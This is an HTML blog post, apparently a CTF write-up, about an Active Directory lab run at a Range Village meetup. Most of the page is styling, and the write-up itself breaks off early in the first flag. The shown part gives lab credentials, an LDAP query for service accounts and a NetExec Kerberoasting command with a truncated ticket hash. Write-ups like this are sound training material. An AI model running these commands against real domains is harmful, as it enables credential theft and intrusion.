@@ -1,0 +1,2311 @@
+<!DOCTYPE html>
+<html lang="en-US">
+  <head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+
+<!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>Range Village CTF, September 2025</title>
+<meta name="generator" content="Jekyll v3.10.0" />
+<meta property="og:title" content="Range Village CTF, September 2025" />
+<meta name="author" content="Zavier Lee" />
+<meta property="og:locale" content="en_US" />
+<link rel="canonical" href="http://0.0.0.0:4000/rv-sept.html" />
+<meta property="og:url" content="http://0.0.0.0:4000/rv-sept.html" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2025-09-07T00:00:00-04:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="Range Village CTF, September 2025" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"Zavier Lee"},"dateModified":"2025-09-07T00:00:00-04:00","datePublished":"2025-09-07T00:00:00-04:00","headline":"Range Village CTF, September 2025","mainEntityOfPage":{"@type":"WebPage","@id":"http://0.0.0.0:4000/rv-sept.html"},"publisher":{"@type":"Organization","logo":{"@type":"ImageObject","url":"http://0.0.0.0:4000/assets/img/logo.png"},"name":"Zavier Lee"},"url":"http://0.0.0.0:4000/rv-sept.html"}</script>
+<!-- End Jekyll SEO tag -->
+
+    <link rel="stylesheet" href="/assets/css/style.css?v=75d6e3e17dd82047b78802147b2893447a331b11">
+    <!--[if lt IE 9]>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7.3/html5shiv.min.js"></script>
+    <![endif]-->
+    <!-- start custom head snippets, customize with your own _includes/head-custom.html file -->
+
+<!-- Setup Google Analytics -->
+
+
+
+<!-- You can set your favicon here -->
+<!-- link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" -->
+
+<!-- end custom head snippets -->
+
+  </head>
+  <body>
+    <div class="wrapper">
+      <header>
+        <h1><a href="http://0.0.0.0:4000/"> </a></h1>
+
+        
+          <img src="/assets/img/logo.png" alt="Logo" />
+        
+
+        <p> </p>
+
+        
+        <p class="view"><a href="https://github.com/ASYNC-Security/async-security.github.io">View the Project on GitHub <small>ASYNC-Security/async-security.github.io</small></a></p>
+        
+
+        
+
+        
+      </header>
+      <section>
+
+      <style>
+    .author-section {
+        padding: 14px;
+        margin: 16px 0;
+        background: rgba(255, 255, 255, 0.02);
+        border: 1px solid #444;
+        border-radius: 6px;
+        position: relative;
+    }
+
+    .author-label {
+        position: absolute;
+        top: -8px;
+        left: 12px;
+        background: #1a1a1a;
+        color: #4da6ff;
+        font-size: 0.75em;
+        font-weight: 600;
+        text-transform: uppercase;
+        letter-spacing: 0.5px;
+        padding: 0 6px;
+    }
+
+    .author-info {
+        display: flex;
+        align-items: center;
+        gap: 12px;
+    }
+
+    .author-avatar {
+        width: 40px;
+        height: 40px;
+        border-radius: 50%;
+        object-fit: cover;
+        box-shadow: 0 2px 6px rgba(77, 166, 255, 0.2);
+    }
+
+    .author-details {
+        flex: 1;
+    }
+
+    .author-name {
+        font-weight: 600;
+        color: white;
+        margin: 0 0 2px 0;
+        font-size: 0.95em;
+    }
+
+    .author-title {
+        color: #ccc;
+        font-size: 0.8em;
+        margin: 0 0 6px 0;
+        font-style: italic;
+    }
+
+    .author-links {
+        display: flex;
+        gap: 8px;
+    }
+
+    .social-link {
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        width: 28px;
+        height: 28px;
+        background: #333;
+        border-radius: 50%;
+        color: #ccc;
+        text-decoration: none;
+        transition: all 0.3s ease;
+        border: 1px solid #444;
+        font-size: 0.7em;
+    }
+
+    .social-link:hover {
+        color: #fff;
+        transform: translateY(-1px);
+        box-shadow: 0 4px 10px rgba(77, 166, 255, 0.3);
+    }
+
+    .post-meta {
+        color: #ccc;
+        font-size: 0.9em;
+        margin-bottom: 12px;
+    }
+
+    .toc-container {
+        margin: 24px 0;
+        background: rgba(255, 255, 255, 0.02);
+        border: 1px solid #444;
+        border-radius: 6px;
+        overflow: hidden;
+    }
+
+    .toc-toggle {
+        background: none;
+        border: none;
+        font-size: 1em;
+        font-weight: 500;
+        cursor: pointer;
+        width: 100%;
+        text-align: left;
+        padding: 16px;
+        color: #fff;
+        display: flex;
+        justify-content: space-between;
+        align-items: center;
+        transition: background-color 0.2s ease;
+    }
+
+    .toc-toggle:hover {
+        background: rgba(255, 255, 255, 0.05);
+    }
+
+    .toc-toggle::after {
+        content: '▼';
+        color: #999;
+        transition: transform 0.3s ease;
+        font-size: 0.8em;
+    }
+
+    .toc-toggle.expanded::after {
+        transform: rotate(180deg);
+    }
+
+    .toc-content {
+        display: none;
+        padding: 0 16px 16px 16px;
+        border-top: 1px solid #333;
+        background: rgba(0, 0, 0, 0.1);
+    }
+
+    .toc-content.expanded {
+        display: block;
+        animation: slideDown 0.3s ease-out;
+    }
+
+    @keyframes slideDown {
+        from {
+            opacity: 0;
+            transform: translateY(-10px);
+        }
+
+        to {
+            opacity: 1;
+            transform: translateY(0);
+        }
+    }
+
+    .toc-container a {
+        color: #ccc;
+        text-decoration: none;
+        transition: color 0.2s ease;
+    }
+
+    .toc-container a:hover {
+        color: #4da6ff;
+        text-decoration: underline;
+    }
+
+    .toc-container ol {
+        margin: 8px 0 0 0;
+        padding-left: 20px;
+        color: #ccc;
+    }
+
+    .toc-container ul {
+        margin: 4px 0;
+        padding-left: 20px;
+        color: #ccc;
+    }
+
+    .toc-container li {
+        margin: 6px 0;
+        line-height: 1.4;
+    }
+
+    .mini-toc {
+        position: fixed;
+        right: 20px;
+        top: 50%;
+        transform: translateY(-50%);
+        width: 260px;
+        max-height: 70vh;
+        background: rgba(26, 26, 26, 0.95);
+        border: 1px solid #444;
+        border-radius: 8px;
+        z-index: 1000;
+        backdrop-filter: blur(10px);
+        opacity: 0;
+        visibility: hidden;
+        transition: all 0.3s ease;
+        box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
+        display: flex;
+        flex-direction: column;
+    }
+
+    .mini-toc.visible {
+        opacity: 1;
+        visibility: visible;
+    }
+
+    .mini-toc.minimized {
+        width: 40px;
+        height: 40px;
+        border-radius: 50%;
+        max-height: none;
+        overflow: hidden;
+    }
+
+    .mini-toc-header {
+        display: flex;
+        align-items: center;
+        justify-content: space-between;
+        padding: 16px;
+        border-bottom: 1px solid #333;
+        flex-shrink: 0;
+    }
+
+    .mini-toc.minimized .mini-toc-header {
+        padding: 8px;
+        border-bottom: none;
+        justify-content: center;
+    }
+
+    .mini-toc-title {
+        font-size: 0.85em;
+        font-weight: 600;
+        color: #4da6ff;
+        text-transform: uppercase;
+        letter-spacing: 0.5px;
+        margin: 0;
+    }
+
+    .mini-toc.minimized .mini-toc-title {
+        display: none;
+    }
+
+    .mini-toc-minimize {
+        background: none;
+        border: none;
+        color: #999;
+        cursor: pointer;
+        padding: 4px;
+        border-radius: 4px;
+        transition: all 0.2s ease;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        width: 24px;
+        height: 24px;
+    }
+
+    .mini-toc-minimize:hover {
+        color: #4da6ff;
+        background: rgba(77, 166, 255, 0.1);
+    }
+
+    .mini-toc-minimize svg {
+        width: 14px;
+        height: 14px;
+        transition: transform 0.3s ease;
+    }
+
+    .mini-toc.minimized .mini-toc-minimize svg {
+        transform: rotate(180deg);
+    }
+
+    .mini-toc-content {
+        flex: 1;
+        overflow-y: auto;
+        padding: 16px;
+    }
+
+    .mini-toc.minimized .mini-toc-content {
+        display: none;
+    }
+
+    .mini-toc ul, .mini-toc ol {
+        list-style: none;
+        margin: 0;
+        padding: 0;
+    }
+
+    .mini-toc li {
+        margin: 0;
+        padding: 0;
+        font-size: 1.12em;
+    }
+
+    .mini-toc a {
+        display: block;
+        color: #ccc;
+        text-decoration: none;
+        font-size: 0.8em;
+        line-height: 1.5;
+        padding: 6px 0;
+        transition: all 0.2s ease;
+        border-left: 2px solid transparent;
+        padding-left: 12px;
+        margin-left: -12px;
+        border-radius: 0 4px 4px 0;
+    }
+
+    .mini-toc a:hover {
+        color: #4da6ff;
+        border-left-color: #4da6ff;
+        background: rgba(77, 166, 255, 0.05);
+        padding-left: 16px;
+    }
+
+    .mini-toc a.active {
+        color: #4da6ff;
+        border-left-color: #4da6ff;
+        background: rgba(77, 166, 255, 0.1);
+        padding-left: 16px;
+        font-weight: 500;
+    }
+
+    .mini-toc ul ul,
+    .mini-toc ol ol,
+    .mini-toc ul ol,
+    .mini-toc ol ul {
+        margin-left: 16px;
+        margin-top: 4px;
+        margin-bottom: 4px;
+        border-left: 1px solid rgba(255, 255, 255, 0.1);
+        padding-left: 8px;
+    }
+
+    .mini-toc ul ul a,
+    .mini-toc ol ol a,
+    .mini-toc ul ol a,
+    .mini-toc ol ul a {
+        font-size: 0.75em;
+        opacity: 0.9;
+    }
+
+    .mini-toc ul ul ul a,
+    .mini-toc ol ol ol a,
+    .mini-toc ul ol ol a,
+    .mini-toc ol ul ul a {
+        font-size: 0.7em;
+        opacity: 0.8;
+    }
+
+    .mini-toc-content::-webkit-scrollbar {
+        width: 4px;
+    }
+
+    .mini-toc-content::-webkit-scrollbar-track {
+        background: rgba(255, 255, 255, 0.05);
+        border-radius: 2px;
+    }
+
+    .mini-toc-content::-webkit-scrollbar-thumb {
+        background: #4da6ff;
+        border-radius: 2px;
+    }
+
+    .mini-toc-content::-webkit-scrollbar-thumb:hover {
+        background: #66b3ff;
+    }
+
+    @media (max-width: 962px) {
+        .toc-container {
+            margin: 16px 0;
+        }
+
+        .toc-toggle {
+            padding: 12px;
+            font-size: 0.95em;
+        }
+
+        .toc-content {
+            padding: 0 12px 12px 12px;
+        }
+
+        .mini-toc {
+            display: none;
+        }
+    }
+
+    @media (max-width: 1400px) {
+        .mini-toc {
+            right: 10px;
+            width: 260px;
+        }
+    }
+
+    @media (max-width: 1200px) {
+        .mini-toc {
+            width: 240px;
+        }
+    }
+
+    @media (max-width: 962px) {
+        .author-section {
+            margin: 16px 0;
+            padding: 16px;
+            border-radius: 6px;
+        }
+
+        .author-label {
+            top: -8px;
+            left: 12px;
+            font-size: 0.8em;
+        }
+
+        .author-info {
+            gap: 12px;
+        }
+
+        .author-avatar {
+            width: 48px;
+            height: 48px;
+            border-width: 2px;
+        }
+
+        .author-name {
+            font-size: 1em;
+        }
+
+        .author-title {
+            font-size: 0.9em;
+        }
+
+        .author-links {
+            gap: 12px;
+            flex-wrap: wrap;
+        }
+
+        .post-meta {
+            margin-bottom: 8px;
+        }
+
+        h1 {
+            margin-top: 0;
+            margin-bottom: 10px;
+        }
+
+        section {
+            padding-top: 0 !important;
+        }
+
+        hr {
+            display: none;
+        }
+    }
+
+    .post-header {
+        display: flex;
+        align-items: center;
+        justify-content: space-between;
+        margin-bottom: 28px;
+        flex-wrap: wrap;
+        gap: 12px;
+    }
+
+    .back-button {
+        display: inline-flex;
+        align-items: center;
+        gap: 6px;
+        padding: 8px 12px;
+        background: rgba(255, 255, 255, 0.05);
+        border: 1px solid #444;
+        border-radius: 20px;
+        color: #ccc;
+        text-decoration: none;
+        font-size: 0.85em;
+        font-weight: 500;
+        transition: all 0.3s ease;
+        width: fit-content;
+        outline: none;
+    }
+
+    .back-button:hover {
+        background: rgba(255, 255, 255, 0.08);
+        color: #4da6ff;
+        border-color: #4da6ff;
+        transform: translateY(-1px);
+        box-shadow: 0 2px 8px rgba(77, 166, 255, 0.2);
+        outline: none;
+    }
+
+    .back-button:focus {
+        outline: none;
+        box-shadow: 0 0 0 2px rgba(77, 166, 255, 0.3);
+    }
+
+    .back-button svg {
+        width: 14px;
+        height: 14px;
+        transition: transform 0.3s ease;
+    }
+
+    .back-button:hover svg {
+        transform: translateX(-2px);
+    }
+
+    .post-meta {
+        color: #999;
+        font-size: 0.85em;
+        padding: 6px 12px;
+        background: rgba(255, 255, 255, 0.03);
+        border: 1px solid rgba(255, 255, 255, 0.08);
+        border-radius: 12px;
+        display: inline-block;
+        font-weight: 500;
+        letter-spacing: 0.3px;
+        margin: 0;
+    }
+
+    @media (max-width: 962px) {
+        .post-header {
+            flex-direction: column;
+            align-items: flex-start;
+            margin-bottom: 24px;
+            gap: 8px;
+        }
+
+        .back-button {
+            margin-top: 12px;
+            padding: 6px 10px;
+            font-size: 0.8em;
+        }
+
+        .back-button svg {
+            width: 12px;
+            height: 12px;
+        }
+
+        .post-meta {
+            font-size: 0.8em;
+            padding: 5px 10px;
+        }
+    }
+</style>
+
+<div class="post-header">
+    <a href="/" class="back-button">
+        <svg xmlns="http://www.w3.org/2000/svg" fill="currentColor" viewBox="0 0 16 16">
+            <path fill-rule="evenodd"
+                d="M15 8a.5.5 0 0 0-.5-.5H2.707l3.147-3.146a.5.5 0 1 0-.708-.708l-4 4a.5.5 0 0 0 0 .708l4 4a.5.5 0 0 0 .708-.708L2.707 8.5H14.5A.5.5 0 0 0 15 8z" />
+        </svg>
+        Back
+    </a>
+
+    
+    <small class="post-meta">7 September 2025</small>
+    
+</div>
+
+
+
+
+
+<div class="author-section">
+    <div class="author-label">Author</div>
+    <div class="author-info">
+        
+        <img src="./assets/img/authors/zavier.png" alt="Zavier Lee" class="author-avatar">
+        
+        <div class="author-details">
+            <div class="author-name">Zavier Lee</div>
+            
+            <div class="author-title">Offensive Security Engineer</div>
+            
+            <div class="author-links">
+                
+                <a href="https://x.com/gatariee" target="_blank" class="social-link twitter" aria-label="Twitter">
+                    <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor"
+                        class="bi bi-twitter-x" viewBox="0 0 16 16">
+                        <path
+                            d="M12.6.75h2.454l-5.36 6.142L16 15.25h-4.937l-3.867-5.07-4.425 5.07H.316l5.733-6.57L0 .75h5.063l3.495 4.633L12.601.75Zm-.86 13.028h1.36L4.323 2.145H2.865z" />
+                    </svg>
+                </a>
+                
+                
+                <a href="https://github.com/gatariee" target="_blank" class="social-link github" aria-label="GitHub">
+                    <svg width="24" height="24" viewBox="0 0 24 24" fill="currentColor">
+                        <path
+                            d="M12 0c-6.626 0-12 5.373-12 12 0 5.302 3.438 9.8 8.207 11.387.599.111.793-.261.793-.577v-2.234c-3.338.726-4.033-1.416-4.033-1.416-.546-1.387-1.333-1.756-1.333-1.756-1.089-.745.083-.729.083-.729 1.205.084 1.839 1.237 1.839 1.237 1.07 1.834 2.807 1.304 3.492.997.107-.775.418-1.305.762-1.604-2.665-.305-5.467-1.334-5.467-5.931 0-1.311.469-2.381 1.236-3.221-.124-.303-.535-1.524.117-3.176 0 0 1.008-.322 3.301 1.23.957-.266 1.983-.399 3.003-.404 1.02.005 2.047.138 3.006.404 2.291-1.552 3.297-1.23 3.297-1.23.653 1.653.242 2.874.118 3.176.77.84 1.235 1.911 1.235 3.221 0 4.609-2.807 5.624-5.479 5.921.43.372.823 1.102.823 2.222v3.293c0 .319.192.694.801.576 4.765-1.589 8.199-6.086 8.199-11.386 0-6.627-5.373-12-12-12z" />
+                    </svg>
+                </a>
+                
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+<div class="mini-toc" id="miniToc">
+    <div class="mini-toc-header">
+        <div class="mini-toc-title">Contents</div>
+        <button class="mini-toc-minimize" onclick="toggleMiniToc()" aria-label="Minimize TOC">
+            <svg xmlns="http://www.w3.org/2000/svg" fill="currentColor" viewBox="0 0 16 16">
+                <path fill-rule="evenodd" d="M1 8a.5.5 0 0 1 .5-.5h13a.5.5 0 0 1 0 1h-13A.5.5 0 0 1 1 8zM7.646 4.146a.5.5 0 0 1 .708 0l2 2a.5.5 0 0 1-.708.708L8.5 5.707V11.5a.5.5 0 0 1-1 0V5.707L6.354 6.854a.5.5 0 1 1-.708-.708l2-2z"/>
+            </svg>
+        </button>
+    </div>
+    <div class="mini-toc-content" id="miniTocContent"></div>
+</div>
+
+<h1 id="range-village-ctf-september-2025">Range Village CTF, September 2025</h1>
+
+<p>Last weekend, we sponsored an Active Directory lab that was showcased during the <a href="https://www.meetup.com/div0_sg/events/310625377/">September Range Village Meetup</a>, hosted by <a href="https://www.div0.sg/">Division Zero (Div0)</a> and the <a href="https://www.linkedin.com/company/the-range-village/">Range Village crew</a>. The event was a great success, with close to 40 participants joining us for an evening of learning and fun!</p>
+
+<p>This blog post provides an overview of the lab, including the challenges, statistics, and solutions for each flag. There are multiple solutions for some of the flags, so if you have done the lab - do look out for the alternative methods covered in this post!</p>
+
+<ul>
+  <li><a href="#range-village-ctf-september-2025">Range Village CTF, September 2025</a>
+    <ul>
+      <li><a href="#challenge-overview">Challenge Overview</a></li>
+      <li><a href="#solve-statistics">Solve Statistics</a></li>
+    </ul>
+  </li>
+  <li><a href="#flag-1-and-so-it-begins">Flag 1: And, so it begins…</a>
+    <ul>
+      <li><a href="#path-1-kerberoasting">Path 1: Kerberoasting</a>
+        <ul>
+          <li><a href="#roasting-the-easy-way">Roasting (The Easy Way)</a></li>
+          <li><a href="#roasting-the-hard-way">Roasting (The Hard Way)</a></li>
+        </ul>
+      </li>
+      <li><a href="#path-2-cross-forest-enumeration">Path 2: Cross-Forest Enumeration</a></li>
+      <li><a href="#looting-shares">Looting Shares</a></li>
+    </ul>
+  </li>
+  <li><a href="#flag-2-access-uncontrolled">Flag 2: Access (Un)controlled</a>
+    <ul>
+      <li><a href="#identifying-privileged-groups">Identifying Privileged Groups</a></li>
+      <li><a href="#machineaccountquota">MachineAccountQuota</a></li>
+      <li><a href="#abusing-genericall-on-group">Abusing GenericAll on Group</a></li>
+    </ul>
+  </li>
+  <li><a href="#flag-3-moving-laterally">Flag 3: Moving Laterally</a></li>
+  <li><a href="#flag-4-historical-scar">Flag 4: Historical Scar</a></li>
+  <li><a href="#flag-5-silver">Flag 5: Silver</a>
+    <ul>
+      <li><a href="#path-1-silver-ticket">Path 1: Silver Ticket</a>
+        <ul>
+          <li><a href="#understanding-kerberos">Understanding Kerberos</a></li>
+          <li><a href="#fetching-the-pac">Fetching the PAC</a></li>
+          <li><a href="#forging-tickets">Forging Tickets</a></li>
+          <li><a href="#accessing-mssql-as-administrator">Accessing MSSQL as Administrator</a></li>
+          <li><a href="#local-privilege-escalation">Local Privilege Escalation</a></li>
+        </ul>
+      </li>
+      <li><a href="#path-2-s4u2self">Path 2: S4u2self</a>
+        <ul>
+          <li><a href="#s4u2self-extension">S4u2self Extension</a></li>
+          <li><a href="#accessing-mssql-as-administrator-1">Accessing MSSQL as Administrator</a></li>
+        </ul>
+      </li>
+      <li><a href="#path-3-runas">Path 3: RunAs</a>
+        <ul>
+          <li><a href="#uac-bypass-via-computerdefaultsexe">UAC Bypass via computerdefaults.exe</a></li>
+        </ul>
+      </li>
+      <li><a href="#path-4-adding-svc_sql-to-senior-developers">Path 4: Adding <code class="language-plaintext highlighter-rouge">svc_sql</code> to <code class="language-plaintext highlighter-rouge">senior-developers</code></a></li>
+    </ul>
+  </li>
+  <li><a href="#flag-6-antennae">Flag 6: Antennae</a>
+    <ul>
+      <li><a href="#dumping-lsass">Dumping LSASS</a></li>
+      <li><a href="#dcsync-attack">DCSync Attack</a></li>
+    </ul>
+  </li>
+  <li><a href="#flag-7-privilege-deescalation">Flag 7: Privilege (De)escalation?</a>
+    <ul>
+      <li><a href="#cross-forest-enumeration">Cross-Forest Enumeration</a></li>
+      <li><a href="#finding-foreign-group-memberships">Finding Foreign Group Memberships</a></li>
+      <li><a href="#dcsyncing-natashalim">DCSyncing natasha.lim</a></li>
+      <li><a href="#foreign-maq">Foreign MAQ</a></li>
+      <li><a href="#abusing-genericall-on-group-again">Abusing GenericAll on Group, again</a></li>
+      <li><a href="#local-administrator">Local Administrator</a></li>
+    </ul>
+  </li>
+</ul>
+
+<div class="toc-container">
+  <button class="toc-toggle" onclick="toggleToc()">Table of Contents</button>
+  <div class="toc-content" id="tocContent">
+    <ol>
+      <li>
+        <a href="#range-village-ctf-september-2025">Range Village CTF, September 2025</a>
+        <ul>
+          <li><a href="#challenge-overview">Challenge Overview</a></li>
+          <li><a href="#solve-statistics">Solve Statistics</a></li>
+        </ul>
+      </li>
+      <li>
+        <a href="#flag-1-and-so-it-begins">And, so it begins...</a>
+        <ul>
+            <li><a href="#path-1-kerberoasting">Kerberoasting</a></li>
+                <ul>
+                    <li><a href="#roasting-the-easy-way">Roasting (The Easy Way)</a></li>
+                    <li><a href="#roasting-the-hard-way">Roasting (The Hard Way)</a></li>
+                </ul>
+            <li><a href="#path-2-cross-forest-enumeration">Cross-Forest Enumeration</a></li>
+            <li><a href="#looting-shares">Looting Shares</a></li>
+        </ul>
+      </li>
+      <li>
+        <a href="#flag-2-access-uncontrolled">Access (Un)controlled</a>
+            <ul>
+                <li><a href="#identifying-privileged-groups">Identifying Privileged Groups</a></li>
+                <li><a href="#machineaccountquota">MachineAccountQuota</a></li>
+                <li><a href="#abusing-genericall-on-group">Abusing GenericAll on Group</a></li>
+            </ul>
+      </li>
+      <li>
+        <a href="#flag-3-moving-laterally">Moving Laterally</a>
+      </li>
+      <li>
+        <a href="#flag-4-historical-scar">Historical Scar</a>
+      </li>
+      <li>
+        <a href="#flag-5-silver">Silver</a>
+        <ul>
+          <li><a href="#path-1-silver-ticket">Path 1: Silver Ticket</a></li>
+          <ul>
+            <li><a href="#understanding-kerberos">Understanding Kerberos</a></li>
+            <li><a href="#fetching-the-pac">Fetching the PAC</a></li>
+            <li><a href="#forging-tickets">Forging Tickets</a></li>
+            <li><a href="#accessing-mssql-as-administrator">Accessing MSSQL as Administrator</a></li>
+            <li><a href="#local-privilege-escalation">Local Privilege Escalation</a></li>
+          </ul>
+          <li><a href="#path-2-s4u2self">Path 2: S4u2self</a></li>
+          <ul>
+            <li><a href="#s4u2self-extension">S4u2self Extension</a></li>
+            <li><a href="#accessing-mssql-as-administrator-1">Accessing MSSQL as Administrator</a></li>
+        </ul>
+          <li><a href="#path-3-runas">Path 3: RunAs</a></li>
+          <ul>
+            <li><a href="#uac-bypass-via-computerdefaultsexe">UAC Bypass via computerdefaults.exe</a></li>
+          </ul>
+          <li><a href="#path-4-adding-svc_sql-to-senior-developers">Path 4: Adding svc_sql to senior-developers</a></li>
+        </ul>
+        </li>
+      <li>
+        <a href="#flag-6-antennae">Antennae</a>
+      </li>
+      <ul>
+        <li><a href="#dumping-lsass">Dumping LSASS</a></li>
+        <li><a href="#dcsync-attack">DCSync Attack</a></li>
+      </ul>
+      <li>
+        <a href="#flag-7-privilege-deescalation">Privilege (De)escalation?</a>
+        <ul>
+          <li><a href="#cross-forest-enumeration">Cross-Forest Enumeration</a></li>
+          <li><a href="#finding-foreign-group-memberships">Finding Foreign Group Memberships</a></li>
+        </ul>
+      </li>
+    </ol>
+  </div>
+</div>
+
+<h2 id="challenge-overview">Challenge Overview</h2>
+
+<p>The lab was designed to simulate a real-world Active Directory environment, while also being beginner-friendly. There were a total of 8 flags, across 4 machines and 2 domains, with a mix of easy and challenging flags to cater to participants of all skill levels. The lab was structured to encourage collaboration and teamwork, with participants working together to solve the challenges and capture the flags.</p>
+
+<p><img src="/assets/img/rv-sept/challenges.png" alt="challenges" /></p>
+
+<p>The lab featured 2 domains: <code class="language-plaintext highlighter-rouge">antennae.rv</code> and <code class="language-plaintext highlighter-rouge">backward.rv</code> - and 4 machines: <code class="language-plaintext highlighter-rouge">dc01.antennae.rv</code>, <code class="language-plaintext highlighter-rouge">sql01.antennae.rv</code>, <code class="language-plaintext highlighter-rouge">dc02.backward.rv</code> and <code class="language-plaintext highlighter-rouge">srv01.backward.rv</code>. The following credentials were provided to all participants at the start of the event to simulate an <a href="https://trustedsec.com/blog/assumed-breach-the-evolution-of-offensive-security-testing">assumed breach scenario</a>:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>User: chloe.lim@antennae.rv
+Password: BZCJsopuOPgH
+</code></pre></div></div>
+
+<h2 id="solve-statistics">Solve Statistics</h2>
+
+<p>A total of 26 participants captured at least one flag, with only one person successfully completing the entire lab by capturing all 8 flags. The <code class="language-plaintext highlighter-rouge">Silver</code> challenge proved to be the most difficult, showing a sharp decline in solves - from 12 for the <code class="language-plaintext highlighter-rouge">Historical Scar</code> challenge down to just 4 for <code class="language-plaintext highlighter-rouge">Silver</code>.</p>
+
+<p><img src="/assets/img/rv-sept/solves.png" alt="stats" /></p>
+
+<p>Overall, the lab was a great success, with participants enjoying the challenges and learning new skills. The feedback received was overwhelmingly positive, with many participants expressing their appreciation for the opportunity to learn and collaborate in a supportive environment. We would like to extend our gratitude to <a href="https://www.div0.sg/">Div0</a> and <a href="https://www.linkedin.com/company/the-range-village/">Range Village</a> for hosting the event, and we look forward to sponsoring more events in the future!</p>
+
+<h1 id="flag-1-and-so-it-begins">Flag 1: And, so it begins…</h1>
+
+<p><img src="/assets/img/rv-sept/1.png" alt="" /></p>
+
+<h2 id="path-1-kerberoasting">Path 1: Kerberoasting</h2>
+
+<p>Using the given credentials for <code class="language-plaintext highlighter-rouge">chloe.lim@antennae.rv</code>, we can start by enumerating the <code class="language-plaintext highlighter-rouge">antennae.rv</code> domain and identifying users with <a href="https://learn.microsoft.com/en-us/windows/win32/ad/service-principal-names">Service Principal Names (SPNs)</a> set.</p>
+
+<p>We can achieve this using an <code class="language-plaintext highlighter-rouge">LDAP</code> query with <a href="https://www.netexec.wiki/ldap-protocol/query-ldap">NetExec’s</a> <code class="language-plaintext highlighter-rouge">LDAP</code> flag, we’ll find a couple of users with SPNs set:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>~$ nxc ldap dc01.antennae.rv -u 'chloe.lim' -p 'BZCJsopuOPgH' --query "(&amp;(objectClass=user)(servicePrincipalName=*))" "samAccountName servicePrincipalName"
+
+LDAP        10.5.10.10      389    DC01             [*] Windows Server 2022 Build 20348 (name:DC01) (domain:antennae.rv) (signing:None) (channel binding:No TLS cert) 
+LDAP        10.5.10.10      389    DC01             [+] antennae.rv\chloe.lim:BZCJsopuOPgH 
+
+LDAP        10.5.10.10      389    DC01             [+] Response for object: CN=svc_vdi,CN=Users,DC=antennae,DC=rv
+LDAP        10.5.10.10      389    DC01             sAMAccountName       svc_vdi
+LDAP        10.5.10.10      389    DC01             servicePrincipalName HORIZON/VirtualDesktop
+LDAP        10.5.10.10      389    DC01                                  TERMSRV/vdi.antennae.rv
+LDAP        10.5.10.10      389    DC01                                  HTTPS/vdi.antennae.rv
+LDAP        10.5.10.10      389    DC01                                  HORIZON/vdi
+LDAP        10.5.10.10      389    DC01                                  HORIZON/vdi.antennae.rv
+LDAP        10.5.10.10      389    DC01             [+] Response for object: CN=svc_sql,CN=Users,DC=antennae,DC=rv
+LDAP        10.5.10.10      389    DC01             sAMAccountName       svc_sql
+LDAP        10.5.10.10      389    DC01             servicePrincipalName MSSQLSvc/sql01.antennae.rv:1433
+LDAP        10.5.10.10      389    DC01                                  MSSQLSvc/sql01.antennae.rv
+</code></pre></div></div>
+
+<p>The <code class="language-plaintext highlighter-rouge">servicePrincipalName</code> format generally follows the pattern of <code class="language-plaintext highlighter-rouge">service/hostname:port</code> or <code class="language-plaintext highlighter-rouge">service/hostname</code>, indicating the service type and the host it is associated with. In this case, we have two users with SPNs set: <code class="language-plaintext highlighter-rouge">svc_vdi</code> and <code class="language-plaintext highlighter-rouge">svc_sql</code>. Based on the SPNs, we can infer that <code class="language-plaintext highlighter-rouge">svc_vdi</code> is likely associated with a <a href="https://azure.microsoft.com/en-us/resources/cloud-computing-dictionary/what-is-virtual-desktop-infrastructure-vdi">Virtual Desktop Infrastructure (VDI)</a> service running on <code class="language-plaintext highlighter-rouge">vdi.antennae.rv</code>, while <code class="language-plaintext highlighter-rouge">svc_sql</code> is associated with a <a href="https://www.microsoft.com/en-us/sql-server/sql-server-downloads">Microsoft SQL Server</a> service running on <code class="language-plaintext highlighter-rouge">sql01.antennae.rv</code> on the default SQL port <code class="language-plaintext highlighter-rouge">1433</code>.</p>
+
+<p>We can perform a <a href="https://www.crowdstrike.com/en-us/cybersecurity-101/cyberattacks/kerberoasting/">Kerberoasting</a> attack on either of these users to obtain an encrypted service ticket for their respective services. These tickets will be encrypted with the service account’s password, which we can then attempt to crack offline.</p>
+
+<blockquote>
+  <p>Kerberoasting is not inherently malicious, requesting service tickets for services is an integral part of Kerberos. This technique only becomes lucrative when the service account is using a weak password.</p>
+</blockquote>
+
+<h3 id="roasting-the-easy-way">Roasting (The Easy Way)</h3>
+
+<p>We can request service tickets for both users using <a href="https://www.netexec.wiki/ldap-protocol/kerberoasting">NetExec</a>, and write the output to a file called <code class="language-plaintext highlighter-rouge">service_tickets.txt</code>:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>~$ nxc ldap dc01.antennae.rv -u 'chloe.lim' -p 'BZCJsopuOPgH' --kerberoasting service_tickets.txt                                                           
+LDAP        10.5.10.10      389    DC01             [*] Windows Server 2022 Build 20348 (name:DC01) (domain:antennae.rv) (signing:None) (channel binding:No TLS cert) 
+LDAP        10.5.10.10      389    DC01             [+] antennae.rv\chloe.lim:BZCJsopuOPgH 
+LDAP        10.5.10.10      389    DC01             [*] Skipping disabled account: krbtgt
+LDAP        10.5.10.10      389    DC01             [*] Total of records returned 2
+LDAP        10.5.10.10      389    DC01             [*] sAMAccountName: svc_vdi, memberOf: CN=Service Accounts,CN=Users,DC=antennae,DC=rv, pwdLastSet: 2025-08-28 15:16:57.992825, lastLogon: 2025-08-28 15:17:30.758637
+LDAP        10.5.10.10      389    DC01             $krb5tgs$23$*svc_vdi$ANTENNAE.RV$antennae.rv\svc_vdi*$1b38c1a87120eefcd7717394fbb96d[....snip...]dc5aa8d0085bbebc39e64c248495570f61b5e1a157
